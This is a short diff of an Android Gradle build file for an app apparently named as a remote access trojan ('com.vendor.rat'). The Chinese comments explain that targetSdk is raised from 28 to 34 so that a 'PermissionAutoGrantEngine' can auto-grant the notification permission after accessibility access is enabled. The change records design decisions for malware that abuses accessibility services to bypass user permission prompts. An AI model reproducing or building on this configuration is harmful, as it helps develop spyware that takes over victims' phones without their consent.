@@ -9,9 +9,9 @@ android {
     defaultConfig {
         applicationId "com.vendor.rat"
         minSdk 21
-        // ADAPT: vendor targetSdk 较低 (28)，避免 Android 13+ 自动弹通知权限
-        // targetSdk 28 = 不触发 POST_NOTIFICATIONS 运行时权限弹窗
-        targetSdk 28
+        // ADAPT: 提升到 34 让 POST_NOTIFICATIONS 成为标准运行时权限
+        // 由 PermissionAutoGrantEngine 在无障碍启用后自动授权
+        targetSdk 34
         versionCode 1
         versionName "1.0.0"
 
